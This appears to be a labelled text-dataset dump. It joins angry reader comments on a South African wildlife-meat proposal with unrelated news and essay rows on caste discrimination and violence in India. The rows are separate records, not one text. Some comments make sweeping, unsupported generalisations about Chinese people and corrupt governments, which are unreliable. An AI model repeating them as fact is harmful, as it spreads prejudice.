be allowed You cant be serious ! I would say South Africa has the very worst leaders who have looted the country dry. Not only that, the infrastructure is crumbling – there is no functioning electricity and many many other breakdowns go unrepaired. I left South Africa 34 years ago for the US, and am I glad I did. Hope you survive there This development towards wildlife, people and the health of the environment is unconscionable and so ignorant and dis-compassionate; one can barely write the words. It must stop now before it goes further; and the people not only of South Africa, but all around the globe must express their opinions about this incomprehensible stance that South Africa is developing vis a vis it’s stewardship with the wild animal of it’s country…..if not even more, then at least the Corona Virus has brought the sinister and deadly truth of that home. This cannot be allow they are killing our nature. This is totally unacceptable. We are already dealing with Caronavirus worldwide. China is shutting down wildlife markets (hopefully permanently). Its ludicrous to think that South Africa wants to deal in wildlife now. I am totally against this proposal. Our wildlife are already under tremendous strain. It shortsighted decision for South African rich biodiversity. It will accelerate transnational environmental crimes that is devastating flora and fauna. Environmental NGO have to sharply opposite SA government decision. Have we learnt nothing from Wuhan and the Corina virus? Our wildlife are to be protected, not eaten. Dont expoit the animals we are meant to protect. SA government wske up and learn…bush meat is not for human consuption. You will cause more pandemics like Covid 19 and Ebola. Protect and prmote our SA wildlife. No to hunting,selling and eating SA wildlife! Tread lightly. You have no right to market the use of any type of animal. Nature is not ours to exploit as we wish. No respect. There should be a worldwide ban called for on tourism to SA. This is beyond sickening. We were lucky enough to go on several wonderful safaris fifteen years ago back when the country was thriving and well- managed, but as things are now we would never go back. It’s so tragic to do this to those beautiful animals, plus of course the very real risk of other pandemics. China and now South Africa. This country is a joke!! The country will be punished for Abusing and Exploiting God’s creatures and nature!! We have just learn that the Corona virus was caused by selling wild animals (alive and dead) at a “wet market” and now the SA government want to promote the selling of the meat. There must be somebody giving out money and somebody receiving money under the table again. Disgraceful decision. Seems that money comes first. Our wildlife is our heritage. Animals also have rights. They were here before humans This is way way way beyond STUPID!! So South Africa is contributing to world syndication by endorsing wild animals as a food source. Are the viruses that we are experiencing world wide not warning enough that this practice is unacceptable – let alone that all rational people disagree with this proposal. Let me think……exchange of money and hand in hand with other foreign Governments to enrich themselves – um yes. Africa and South Africa is notorious for allowing foreign countries to exploit natural resources…..never thinking further than their greedy, sweaty, money grabbing fingers. How easily they are influenced. The cruel sub-species called ‘humans’ are an absolute abomination to the longevity of this planet. The rest of the world are moving away from large meat consumption to vegetation based diets but as usual SA is behind the times, not only in their actions but in the way they think and respond. Money, money, money – the root of all evil. Cruelty, greed, corruption and destruction the only language our species understands until its too late…… typical of south africa, they already sell baby elephants to china, tearing them away from their mothers, just so china can have them, these countries make me sick. My question is why put SA in a lockdown and stop life as we know it and ruin the economy and lifelyhoods if we have learned nothing? Why have over 70 000 Corona Virus infections and trying to flaten the curve as Goverment calls it?? While during behind this pandemic and economic crisis caused by lockdowns and poaching, and wildlife trades, Goverment are looking to open and increase this trade? All the Covid talk, treatmens, and effort are invane and the human life renderd worthless!! SARS, HIV, Ebola and now Covid when will we learn.?These Are all Zootonic meaning came from exotic animals(wildlife) and still it costs Goverment thousands of million of ZAR for treatment of these deaseses and not even talking about human suffering or death by the millions why then allow and aprove the source of these pandemics? Why?? When there are many other safer ways to create food security this is not it…… No No No !!!!!!!!!!! I support you 100% I say no…. This is going to drive all animals to extinction…who eats Elephants and rhino’s? The Chinese… This is to make money by the corrupt Government… No… No… No… I seriously cannot believe this!!!what a joke of a country. I cannot believe the South African Government is even considering such an appalling move. These beautiful creatures are suffering from trophy hunting and many are at risk from extinction. Please please think again prove to the rest of the world rhat South African has a caring compassionate Government that values the wonderful diverse wildife they are bkessed with. Please please please think again. Barbara Bengry The South African gouverment as we know is absolutely and totally corrupt, and this barbaric persiute of killing our wild animals for human and animal consumption is corruption at its highest!! This gouverment should be ashamed of what they are proposing! This government has No Ethics for any kind of life.

0,"In conversation with Shalini Mahadev Back in Hyderabad after seven months, I was to meet Shalini Mahadev, a friend who I met during my masters in sociology from University of Hyderabad. Shalini is still at the university pursuing her PhD in biological sciences. The two of us have talked about caste willingly or unwillingly innumerable times and have always discovered new ways in which it affects us. Recent academic literature and journalism on casteism in higher education has thoroughly investigated the barriers facing students from marginalised sections while entering these spaces or trying to stay in them. The web of identities one constantly travels in also shapes one’s experience of these academic spaces. We had decided to meet in front of the university and drive through the campus, which we call (and think of) as ours. We thought we could enter from one end and exit through the other end of the campus to avoid a longer route to Shalini’s home. We knew that it would be a little tricky as people are barred from entering the university premises given the ongoing pandemic. But as past and present students at this university who are familiar with the guards, we expected to find a way to convince them. Shalini explained to one of them that she has a permit to enter the premises for her lab work. But the guard did not let us in, and asked for the written permit, which was wrecked in the rain. So there we were, at the gate of a university we both are part of, literally trying to enter the university, charged with ideas to share with each other about gatekeeping in Indian academia, thinking about universities as spaces we manage to infiltrate. It was a funny moment—we were stopped by the security forces, and we did end up taking the longer route. When we were finally at Shalini’s home, we had the following conversation where we attempted to uncover the logic with which caste, gender and other identities produce ‘differences’ among the general community of students and scholars. The boy I was made to sit with was very good at studies and I wasn’t. My teacher made me sit with him so I would learn from him and become better at my studies. I remember him uttering his category with such pride, enunciating the word ‘general’ so clearly. Vaishali: We access higher education with an aim to move upwards in life, right? One can say that the decision of stepping into these institutions is aspirational; we want to change our reality. But these institutions have different ways to remind us of our identities. Shalini: Initially, I felt like an equal in most academic/research spaces, and that is how I want to feel. It is these institutions that keep reminding me of caste and other hierarchies. Felt experiences of inequalities have been perpetually shoved in my face through these institutions. I remember even in school they had once asked for the students from SC/ST category to be identified. I was the only student to stand in the SC category. I came back and told my parents thinking it was a good thing to be the only student. They burst out laughing! Vaishali: It is very weird that I also remember a similar moment very vividly. I think I was in class 8 or 9 when they had called out students to know their caste category for board registration, I think. I have a visual memory of that day; I remember where I was sitting that day, how the class was set and even the teacher who asked me. The boy I was made to sit with was very good at studies and I wasn’t. My teacher made me sit with him so I would learn from him and become better at my studies. I remember him uttering his category with such pride, enunciating the word ‘general’ so clearly. Shalini: I was once in a coaching centre preparing for medical entrance tests because I wanted to be a doctor. It was a challenging and competitive environment where people studied all day and night. We used to get a 15-minute break to eat. I learnt about reservations at that time. They used to directly and unashamedly ask SC students to stand in the class and tell their ranks. They would compare my marks and rank with other upper-caste girls’ and remark that she would not get the same college as I would with the same rank as mine. This is just one of the several instances where I was humiliated in the coaching centre. The atmosphere was extremely competitive. Travelling to and from this centre was so hectic. I spent so much time hopping from one bus to another that I hardly got any time to read. People would come in their cars with their packed lunches. If I had that kind of time, I remember thinking that I would definitely outsmart them. Commuting to these places at all kinds of odd hours, even early mornings, didn’t feel safe. I have been harassed so many times. I have noticed it is also about us Dalit girls and the way we are seen by men on the streets. Brahmin women carry this “good family-girl” image, which men can see. They laugh differently and they look different. Their skin colour and faces are a certain way, they wear certain types of clothes and their hair is a certain way. Vaishali: When I entered my college for my undergraduate degree in Delhi University, coming from a really small district and a lower-caste background, it was a very challenging time for me and my mental health. While entering elite universities, the first thing that stares right at you is the alienation. It was a completely alienating atmosphere where you relate to nothing and no one. I could not relate to my peers, didn’t know how to participate in conversations, did not get any jokes, or even the language that they used. The courses would be in a language that is too difficult to understand. I feel that in the social sciences, there is this heavy use of jargon, which is used to make students from reservations feel stupid, inadequate and unfit. Consequently, I had terrible social anxiety and I still do, every time I enter a new institution. Despite reservations, I do not think that universities are equipped to enable SC/ST students to sustain themselves. Vaishali: It is interesting how upper-caste people think that we don’t study or we are lazy, when we have to do double the work. I went to a popularly progressive college but students wouldn’t shy away from asking if one is a “reservation candidate”. I had a terrible inferiority complex. Though I was very much interested in literature, I would not speak in class. However, I would keep reading and trying to write good assignments, just because I did not want to be called a “reservation candidate”. I felt like I had to read and write so much and so well—anything less than that was just not enough. We put ourselves under such pressure and unreal expectations just to burst these myths about reservations. We internalise so much guilt. Even though one changes the language, how much does the hierarchy change in the actual sense? Existing hierarchies in the labs, like between interns, JRFs, PhD students, postdocs and the supervisors, are fixed even though we call each other by first names. Shalini: I was working as a junior research fellow (JRF) in an institute which had liberal workplace ethics. They would ask us to not address the professors as Sir/Ma’am, but insist on first names. It took me so much time to get used to this. Even though one changes the language, how much does the hierarchy change in the actual sense? Existing hierarchies (and the socially contracted power dynamics between them) in the labs, like between interns, JRFs, PhD students, postdocs and the supervisors, are fixed even though we call each other by first names. Vaishali: I agree. It does not really impact much. Do you think it has to do with this culture of political correctness and insistence on changing the language rather than a bigger and a more difficult transformation of material everyday hierarchies? Shalini: I think political correctness, mannerisms and language also are so elite and diplomatic. What we have been taught at homes is the language which is “rough” and which gets things done. My language is very Hyderabadi. People say Hyderabadi is abrasive due to colloquial way of speaking/lack of honorifics, and usually, it is also very easily written off as being “impolite” and “uncivilised”. It took me time and effort to even improve my Hindi and English. Even in school, there were kids who used to read novels in 8th or 9th standard. If my parents caught me reading a novel at that age, they would have asked if I have totally given up on studies or what! I will be honest: I could not inculcate the habit of reading. Even in science, there is so much information and data to mug up that there is little scope of creativity. So what if the language I use is simply to communicate my issues and problems plainly. Neither do I understand these language problems, nor do I have the time for it. I have been told that I do not know how to speak. I do not understand what they mean. I know English pretty well, I have no problem in comprehending English; then, what is it that I can’t speak? Vaishali: Is it that you do not know how to speak? I think, rather, we do not have the language that will validate the elite majority. I think they expect us to talk in a way where we are responsible for maintaining the hierarchy and making them feel better generally. If our sentences do not deal with them and instead focus on us and our problems only, it seems impolite. I have faced similar issues; I always felt separated from my peers as well as my professors. I did not know how to socialise with them. I have felt that in the social sciences, there is so much influence of informal “hanging out” with the professors. It is almost like a diluted form of corruption where one needs to have a certain rapport or networks, which are formed by having similar interests with professors and peers that are outside the domain of the discipline you are studying. I have just never been able to do that. Every time I am in a class or a conference, I can never go and talk, not because I do not know the language but because I do not share the same sensibilities. I do not even share those mannerisms which are produced, consumed and enforced by these elite classes only. Shalini: Entering university, especially with the recent trend of political correctness, has made language more calculative for me. When you come to campus, you are taught so many things politically (and generally). I have been lucky that my friends took the time to explain many things to me. At least in science, terms are easy to understand. On the other hand in humanities and the social sciences, the terms are, in fact, concepts, which are so difficult to grasp. They have multiple meanings in varied contexts. I have realised that even within this space, academicians cannot simplify the terms. Even after learning, there is so much anxiety from conversation to conversation. The more you know, the more anxiety one has to deal with. Vaishali: Yes, I agree. Even the increasing discussions on caste in university campuses have a dual effect. Caste has recently become a popular topic of discussion, and I cannot help but think whether it has to be a dominant discourse or a trend for people to participate in a serious discussion about caste or Dalit feminism. Even when caste becomes a mainstream topic of discussion, the baton must still remain with Dalits who have been talking about it and living it much before the media considered it as something important. Before a year or two, if I would bring up caste, a majority of times I would be told that I bring caste into discussions where it doesn’t belong or does not simply exist. Now, it is the same people who are posting pictures of Ambedkar on their social media. It is amusing actually how people are directed according to the media discourse. I wonder how long it will last. I haven’t really seen it, but I want to see how two Brahmin women in academia will talk about caste, maybe about how being a Brahmin has benefitted them in academic spaces, and how Brahminical patriarchy has affected their growth. Shalini: I remember you talking about a professor who would immediately pick you when talking about caste. Now, with all these discussions on caste, again it is a burden put on us where we must talk about caste, and caste only. Vaishali: I remember, yes. It used to be so frustrating! Every time someone would utter the word “caste” or ”Dalit”, he would take my name and ask my opinion. You are reduced to a Dalit student, a Dalit scholar or a Dalit friend. Sometimes, I do not want to engage in these discussions only because I know it simply means more to me than to them, and I know the effect it will have on me. “Woke” or performative culture has provided the progressive upper castes with tokenism which gives easy gratification. How we suffer from this is evident by being a token, but apart from that, if you have once been given that tag, you cannot rise above it. Although it is true that I study caste and it affects me directly and materially, I also read other things apart from caste and gender that I am equipped to talk about. I also sometimes feel that a discussion on caste is not just a discussion for us. It takes so much emotional investment sometimes to talk about caste. There are times when I have felt that the only way to engage in the discussion is to share a personal detail, which is often about a triggering moment where my caste was highlighted. It is like your engagement always comes at a cost of sharing something excruciatingly difficult. Shalini: It is, because for them, it is just a discussion they are a part of. It takes such a toll on mental health. Many times these discussions have been with me after they have happened. They will forget it the minute it is over just because it is not really a matter of identity or existence for them. For us, it gets in the way of how we function, and we spend two days thinking about what happened and playing it in our head again and again. Vaishali: It is not them who is being talked about. That’s so true! At my home, nobody sits and talks about being a Dalit. Everyone is familiar with that. They will talk about Brahmins and Savarnas. We will joke about their mannerisms, their habits and their hollow pride. But in academics, we are always the subjects who are being talked about. It is like a museumisation of experience itself. Shalini: A friend of mine told me once that when we go in their space and give a talk, we become their subjects. They will always look at us in a setting where we are subjects from whom knowledge has to be gathered, but we ourselves do not have much knowledge. We should sit and study them instead! But, who would fund such a study anyway? But coming back, I also know that I do talk about myself. I came to know more things when I was once asked to write an article. But I could not just write about my experiences, I had to constantly justify and give names to refer in order to validate those experiences. I might not want to say all of everything. Basically, they wanted me to write in a certain way. It means even the process of studying me will be in their own way and the way they agree upon. They talk so much about individuality and subjectivity, but I don’t know how that works out. Vaishali: It is so true. Especially in the social sciences, any study on caste readily translates into incessantly researching Dalits. Even now, it is you and I who are talking about being Dalit and a woman. I haven’t really seen it, but I want to see how two Brahmin women in academia will talk about caste, maybe about how being a Brahmin has benefitted them in academic spaces, and how Brahminical patriarchy has affected their growth. I feel there are so many interesting questions to deal with in the world of upper castes. I have noticed this a lot lately. Even when we read anti-caste literature, Ambedkar and Periyar begin the study of the caste stratified society by examining the “brahmin-non-brahmin” divide. Phule also conceptualises the caste society in terms of Shetji-Bhatji. Meaning, these theorisations have been written by taking the Upper Castes as the subject of study. However, when academic spaces began and when one studied early as well as contemporary sociological studies about castes in India, we see these studies being done on Dalits by upper castes. So something must have changed during the conception of academics where this focus of becoming subjects shifted and Dalits were made the subjects of the knowledge created instead of being the agencies that created academic and theoretical knowledge which stemmed from the anti-caste politics itself. Thank you for these conversations with you, Shalini. Now, this is not the first time we have talked about academic spaces in such detail so I also feel like there was so little we could actually record through this article. The issues that one faces are never-ending, hence the things we could cover in this article are limitless. The ways in which universities as spaces and higher education, in general, have compounded the identities like caste and gender is very interesting to observe. We both feel that the nature of these conversations must be dialectic with an aim to form newer and more nuanced discussions around academic spaces.

The CPI(M) (often called CPM), she said in her Facebook post, has been continually harassing her in the name of caste. Tired of waging the lone battle, she has now made the decision to break free from the shackles of caste by converting to Islam. Stating that she had to learn more about the religion before converting, she said she hadn’t decided when to embrace Islam yet. “Some people have offered to help me with these learnings. But I do not wish to reveal their names here. Once I make a final decision, I will announce it publicly,” she said. Meanwhile, she warned people against troubling her further with allegations of ‘love jihad’, adding that all she wished was to live peacefully. Chithra Lekha made headlines after she fell into a dispute with the union leaders when working as an autorickshaw driver at Edatt in Payannur. She had conducted agitations alleging that CPM activists are not allowing her to continue with her livelihood. Following this, some people torched her autorickshaw. Finally, Chithra Lekha shifted to a rented house at Kattambally in Kannur. But the CPM men continue to attack her in the new place too.  Rushda Fathima Khan is the Staff Reporter for The Cognate.

According to them, the incident took place at around 3 am on Saturday when several armed people attacked the home of a family and assaulted five of its members before shooting two of them. The victims were identified as Anmol Rishi (50) and Subodh Rishi (45) — both daily wage workers. They reportedly succumbed to injuries while being taken to the hospital. Banmankhi sub-divisional police officer Vibhash Kumar said: “Prima facie, it looks to be a case of land dispute. The victims, cousins, had been possessing a four acre piece of land which some other villagers claimed their as own… We are trying to identify the attackers.” A case has been filed against unknown people under relevant sections of the Scheduled Caste and Scheduled Tribe (Prevention of Atrocities) Act as well as provisions of the Indian Penal Code (IPC). Ramesh Rishi, a resident of the village, said some influential villagers had been threatening Rishi families to vacate the four-acre area of land where they had raised their houses and had been living for years. “Anmol and Subodh had been opposing upper caste families of the village in their bid to get the land vacated, they were targeted,” he said. Purnea Superintendent of Police Vishal Sharma told The Indian Express: “The suspects are also missing after the incident. No arrests have been made so far. We are carrying our searches.” 📣 The Indian Express is now on Telegram.

0," Manjhi had broken away from the Mahagathbandhan (grand alliance) on August 20 following a rift with the Rastriya Janata Dal (RJD) and its top leadership that includes its supreme leader Lalu Prasad and his son Tejasvi Yadav PATNA – Hindustan Awam Morcha (HAM) leader Jitan Ram Manjhi said on Wednesday that his party has officially joined the National Democratic Alliance (NDA) ahead of the Assembly elections in Bihar scheduled later this year. “We have merged with the NDA without any condition. The party believes in the leadership of Nitish Kumar in Bihar and Prime Minister Narendra Modi in the Centre. Seat sharing is not an issue for HAM. As a coalition partner, we will take whatever seats are offered to us,” Manjhi said. “The main objective of the party is to defeat the grand alliance,” He added. Earlier in the day it was reported that Manjhi is using his personal equation with top leaders of the NDA and trying that his party could contest 10 seats in the forthcoming Assembly elections in Bihar. Manjhi had broken away from the Mahagathbandhan (grand alliance) on August 20 following a rift with the Rastriya Janata Dal (RJD) and its top leadership that includes its supreme leader Lalu Prasad and his son Tejasvi Yadav. Manjhi recently met Chief Minister Nitish Kumar and declared the party’s intention to join the NDA. According to the political buzz in Patna, he is also angling for a Rajya Sabha nomination from the state. Manjhi is one of the most prominent Dalit and Maha Dalit leaders in the state, along with Ram Vilas Paswan. Dalits and Mahadalits comprise 16 per cent of the electorate in Bihar. Manjhi commands a strong performance in the Gaya district in Bihar’s Magadh region. -IANS Dear Reader, Independent and honest journalism is not possible without public support.

0,"Activists say that there has been a dramatic rise in the cases of atrocities in the state in the past few months. Viraj Jagtap (L) and Arvind Bansod. Photo: Special arrangement Mumbai: In two separate cases of caste violence, two Dalit young men were brutally attacked and murdered in Maharashtra. In the first violent incident, that occurred on May 27, a 32-year-old anti-caste activist and an active member of the Vanchit Bahujan Aghadi (VBA) was found dead under suspicious conditions minutes after he had confronted caste Hindu men, all belonging to the Other Backward Class (OBC) ‘Kunbi’ community. The men had allegedly bullied and beaten him and his friend up over a picture they took of the accused’s shop. In another incident, a 20-year-old college student was targeted and killed by Maratha men on June 7 for being in a relationship with a woman from their community. In both incidents, the victims’ families have accused the police of not being responsive and deliberately delaying police action in order to shield the accused.Only after anti-caste activists and political leaders exerted pressure were the police forced to look into the matter seriously. Nagpur incident On May 27, a 32-year-old anti-caste activist and an active member of the VBA in Maharashtra was found dead under suspicious circumstances in Nagpur. The victim, Arvind Bansod, had allegedly died by suicide minutes after he and his friend Gajanan Raut were brutally beaten up by OBC Kunbi caste men in Thadipawani town in Narkhed tehsil of Nagpur district. The prime accused, Mithilesh alias Mayuresh Umarkar, is a local Nationalist Congress Party leader. State home minister and senior NCP leader Anil Deshmukh represents this taluka. Umarkar’s father, Bandopant Umarkar, is a district vice-president of the NCP. Bansod and Raut, friends, had travelled from Pimpaldhara village in Narkhed to the nearby Thadipawani town. When Bansod went to an ATM to access money, Raut had visited a HP gas agency next door. “An old lady in the village had sought a favour and wanted us to get her gas cylinder refilled. Since there were a bunch of numbers mentioned on the board, I decided to click a picture of the shop’s board on my phone. The owners (also the accused) of the shop saw me click pictures, and immediately confiscated my phone,” Raut says. Also read: Nepal: 4 Dalit Men Killed by Upper Caste Mob, Activists Point to History of Discrimination By then Bansod had come back from the ATM and he intervened. Umarkar and his friends, angry that two Dalit men were confronting them, began to beat them up. “They used abusive slurs while thrashing the two of us,” Raut says. Somehow the two had managed to get out of the shop and Raut asked Bansod to sit at the corner of the shop while he went to fetch some petrol for his bike. But when Raut returned in less than five minutes, he saw Bansod lying on the ground unconscious with a bottle of pesticide next to him. Sumedh Gondane, a VBA activist from the area who has been closely following the case, says seeing Raut back at the spot, Umarkar and his friends put Bansod in their car and took him away to a hospital. “They did not let Raut enter the car,” Gondane says. “Umarkar’s behaviour from the start to the end has been suspicious. Still, the police were prompt in declaring this as a suicide without investigating the clear allegations made by Gajanan,” Gondane adds. In the beginning, the police had only filed a case of abetment to suicide against Umarkar and a few others. But Bansod’s death led to a public outcry, with VBA head Prakash Ambedkar and other party members seeking an impartial police investigation into the matter. Activists on the ground have alleged that the story of suicide was not plausible and there were chances of foul play here. Since the accused persons are active members of NCP, Ambedkar has also sought a CBI investigation into the matter. Since the accused in the Arvind Bansod Murder case are related to the Home Minister @AnilDeshmukhNCP, we demand that the CBI take charge of the investigation. The police had already tried to declare the incident as a suicide. #JusticeForArvindBansod pic.twitter.com/06R2PpkqLX — Prakash Ambedkar (@Prksh_Ambedkar) June 9, 2020  As the police continued to stonewall the victim’s family members and activists, and refused to investigate the case seriously, Sandeep Tamgadge, a senior IPS officer from Nagaland cadre but originally a Nagpur resident, decided to intervene in the matter. A delegation of 15 persons, involving activists and representatives of different anti-caste political parties, was formed and a meeting was organised with the Inspector General (Nagpur Range) K.M. Mallikarjuna Prasanna on June 9. The delegation says the meeting allowed them to explain the ground situation to the officials and their demands were eventually accepted.  IG Prasanna confirmed the meeting and added: “We have now enhanced the sections in the FIR and have applied relevant sections of the atrocity Act. We have also decided to provide security to the victim’s family and his friend.” Pune murder In another incident, six Maratha men executed a well-planned attack on a 20-year-old undergraduate student, Viraj Jagtap, for being in love with a girl from their community. On June 7, around 9:30 pm at Pimple Saudagar village in Pimpri Chinchwad taluka of Pune, the men allegedly attacked Jagtap with a rod and boulders, and ran a tempo over him. Viraj, who suffered grave injuries in the attack, died a day later in a hospital. Viraj’s ‘crime’ was that he had been in love with a daughter of one of the prime accused, Jagdish Kate. Four of the six accused – Hemant Kate, Sagar Kate, Kailash Kate and Jagdish – have been taken into police custody. As the remaining two are a few months short of 18, they have been sent to children’s home in Pune. Viraj and Jagdish Kate’s daughter had been in love over the past few months and the latter did not approve of their relationship. According to Viraj’s close friends who were privy to his relationship, the Kates had threatened him two months ago of dire consequences if he did not back off. Also read: UP: Dalit Teen Killed by ‘Upper Caste’ Men After Entering a Temple Viraj’s family says they were unaware of his relationship until the incident, and only after his death did his friends share the backstory with them. “The girl’s family knew about their relationship all along and they had been keeping a close eye on the couple. They had even threatened to kill Viraj a few months ago. We only wish he had shared this with us,” his uncle, Jitesh Jagtap, told The Wire. Jitesh, who is a complainant in the case, also accused the police of not taking their complaint till the time the victim died. “Soon after the incident, we had approached Sangvi police station and asked them to intervene. My nephew was still alive then and recording his statement then was very crucial. But the police shooed us away and said this was some minor feud which did not need their intervention,” Jitesh alleged. Even though the incident occurred on June 7, the police registered an FIR only on June 8, hours after Viraj’s death. The Sangvi police officials, however, said that they had followed the due process and had waited for the doctors to determine his condition before finalising the FIR. “The victim was in a critical condition and we waited for him to stabilise. Unfortunately, he died the next day. We immediately arrested all the accused and have secured their police custody until June 16,” police inspector Ajay Bhosale told The Wire. The case investigation has been handed over to the deputy superintendent of police, Sridhar Jadhav. The crucial link witness, in this case, are Viraj’s college mates and his girlfriend. The police said they are still in the process of recording statements. The police are considering recording key witnesses statements before a magistrate as prescribed under section 164 of the Code of Criminal Procedure (CrPC). The rise in atrocity cases Jitratn Patait, news editor of Prabuddha Bharat, a Marathi fortnightly newspaper, says just in the past two weeks he has documented over 8-9 cases of caste violence in the state. Of them, he says most incidents have been reported in Jalna, Hingoli and Parbani districts of Marathwada region. These cases range between extreme brutalities to the use of casteist slurs and Patait says in almost all cases, the police have remained passive until the time anti-caste activists intervened. “Behind the fake notion of being a progressive state hides a sordid history of violence against the Dalits and Adivasis. And the cases only get more violent when a person resists or asserts,” Patait says. Every day, the home department puts out figures of cases registered against those defying the lockdown orders issued in the state since March to curb the increase in the COVID-19 infections. Over 1.25 lakh cases have been registered just under Section 188 of the Indian Penal Code for ‘Disobedience to order duly promulgated by public servant’. लॉकडाउन लागू झाल्यापासून आयपीसीच्या कलम १८८ अंतर्गत तब्बल १,२४,१०३ गुन्हे नोंदविण्यात आले आहेत. यांत २३,९१५ जण अटक झालेत व ८४,५१७ वाहने जप्त झाली आहेत. ₹६,७८,८१,१९१ इतका दंड गुन्हेगारांकडून वसूल केला गेला आहे. — ANIL DESHMUKH (@AnilDeshmukhNCP) June 9, 2020  “Since the onset of this pandemic, police resources have been diverted into other policing work like maintaining the lockdown and sealing district boundaries. Disproportionate attention is being paid towards policing the masses and very little attention is paid towards the security of the Dalit, Adivasi communities in the state,” Patait observes. The results of this, Patiat says, can be seen in the way cases of atrocities have been on the rise."
0,"The accused, Mohammad Salauddin, was caught after a trap was laid by a team of police and child commission members who posed as citizen volunteers distributing free ration. A minor Dalit girl kidnapped from West Bengal on the pretext of marriage and brought to New Delhi in March, was about to be sold to a trafficker in Rajasthan, but the ongoing lockdown saved her. The girl was rescued in April in a joint operation by the national child commission, Delhi police and a Delhi-based non-government organisation (NGO). The team laid a trap for the kidnapper by posing as citizen volunteers distributing free ration. The girl is currently staying at a women’s shelter and would be taken to her parents after the lockdown ends. The accused, Mohammad Salauddin, was arrested but granted bail. Here’s the story of her kidnapping, the dramatic rescue operation and the prompt bail, owing to police negligence: The girl goes missing The girl’s father Kamal Mondal (name changed, surname retained) lives in a village in South 24 Parganas district of West Bengal. He told this correspondent over phone that on the early morning of 29 February, the family found the girl was not in her bed. They looked around, but did not find her. Later in the day, they reached out to her friends and classmates. A name, Mohammad Salauddin, emerged in the conversations. “I could not believe my girl was seeing someone. She had just appeared for her Class 10 exams. I used to pick her up from school every day. Even for her tuition classes, I would drop her and pick her up. I fail to understand where she even met him,” he told this correspondent. Kamal, who belongs to the Poundra community, which is a scheduled caste, said that the village has Muslims in majority and Hindu families usually accompany their girls outside homes. Kamal has two daughters; the one who was kidnapped is 16 while the other is aged 11. On his complaint, a first information report (number 592/2020) was registered at Barauipur police station on 2 March. When Kamal searched for the girl’s documents to produce her age proof, he found that her Class 10 admit card, Aadhaar card, birth certificate and her bank passbook were missing. While Kamal says he mentioned Salauddin’s name to the police, the statement in the FIR makes no mention of his name. The police only invoked IPC 363 (kidnapping). The accused calls the girl’s family Kamal says that after about a week, he received a call from Salauddin, who he had never spoken to before. Kamal shared an audio recording of the conversation with this correspondent. A brief transcript (as translated from Bengali) is given below: Kamal: Both of you should return now Salauddin: Withdraw the case that you have filed and I will promptly come back Father: Is it that easy? Salauddin: Samaresh (who is implied to be a local cop) is asking me to surrender along with the girl but she is not willing to do so. I am a Muslim and I swear on Allah that I will never give her any troubles The father again asks the boy to return. Salauddin: Everyone is advising me not to return; many cops live in my locality and they too are saying the same thing Father: Cops are telling you not to bring her back? Salauddin: They are advising me to bring her back after a few months Later in the conversation, Salauddin revealed that all he wanted to know was the case number so his lawyer could file for bail. Kamal refused to give it. Kamal tells this correspondent, “This relationship is unacceptable to me as the man is Muslim. Moreover, when I inquired about him, I was told he is heavily into weed and has no job. I can’t ruin my daughter’s life.” “If he really loved my daughter, he should have come to me first. She is just a child. His intentions are not good,” he says. Kamal passed on the phone number to the police, but it was constantly switched off. Weeks passed and Kamal helplessly waited for the police to bring his daughter back. In the beginning of April, he received a call from her in the afternoon. She had called from an unknown number. “All she said was that she was trapped and wanted to come back home. She said she was in Delhi, but did not know her location,” Kamal says. He gave the phone number to the local police. Cops reach kidnapper on pretext of food distribution By that time, a nationwide lockdown had come into effect, and inter-state travel was prohibited. An NGO in Delhi, Mission Mukti Foundation, received a tip-off from a cop in West Bengal. The NGO took the case to the National Commission for Protection of Child Rights. The commission directed the Delhi police to probe. Through the number, the girl’s location was traced to Khajuri Khas. Khajuri Khas is one of the areas in northeast Delhi hit by communal violence that broke out between 23 and 25 February. It was the same area where murdered Intelligence Bureau employee Ankit Sharma lived. Virendra Kumar Singh, director of the NGO, told this correspondent that the police gave him two phone numbers — of families living in the colony where the girl had been kept. The police told him that she was brought to Delhi on 21 March — a day before ‘janta curfew’. Singh then called up the two numbers. He told the men who answered the calls that the NGO would carry out a food distribution drive in the area within two days and they must come at a given spot to collect it. This correspondent has recordings of those conversations. One of the men, Mohammad Aqib (name changed), is heard telling Virendra that the colony has Gujjar-owned houses that have been rented to Muslims, and no ration distribution drive is being carried out in the area. On 21 April, a team comprising NCPCR officials, cops from Khajuri Khas police station and a few volunteers of the NGO reached the spot. When the two families reached the spot, the team questioned them about the girl in confinement in their colony. “For a long time, they kept denying any knowledge of it. Eventually, they agreed to speak on the condition that their name would feature nowhere in the police case,” an NCPCR official said. A woman took the team inside the lane and pointed at the house; the team raided it and detained both the girl and Salauddin. The accused gets bail, thanks to police negligence Virendra Singh told this correspondent that in the presence of cops and NCPCR officials at the police station, the girl said that Salauddin was planning to sell her to someone in Rajasthan. “She said it in front of all officials. If it weren’t for lockdown, she would have been trafficked to Rajasthan by March end,” Singh said. An NCPCR member, who was part of the team, confirmed it. Asked about the girl’s medical report and statement to the magistrate, the member said they have not received information from the police yet. While one wonders what fate the girl could have met if the accused’s plan to traffic her had succeeded, the case as it stands is that the accused is out on bail. “This happened because the Delhi police failed to present the copy of the FIR, that was registered at West Bengal, to the court,” Priyank Kanoongo, chairman of the child commisison, told this correspondent. “The accused got a prompt bail. The FIR itself had weak charges. The police should have invoked POCSO and added section 370 at the time of filing it,” he said. IPC 370 is for trafficking of minors; the Protection of Children from Sexual Offences (POCSO) Act, 2012, has stringent sections for sexual assault on minors. Kanoongo said that it is this inter-state confusion that is failing to put a stop at trafficking — especially that of minor girls. “Unless trafficking is handled by a central agency, such as the CBI, we cannot tackle it,” he said. “When CBI was formed, trafficking was one of its focus areas. Now, state governments have limited their powers in states, and trafficking has gone up,” he said. The girl’s family awaits their daughter Kamal Mondal said that he has managed to talk to his daughter a couple of times since her rescue. As he awaits her, he says ‘the girl’s life has been ruined’. When told that his daughter could resume studies and put the incident behind, Kamal says, “The entire village knows about the case. She has no reputation left. We have no reputation left. We can no longer go out with our heads high.” Virendra Singh told this correspondent that his organisation would counsel the girl and her family. Swati Goel Sharma is a senior editor at Swarajya.

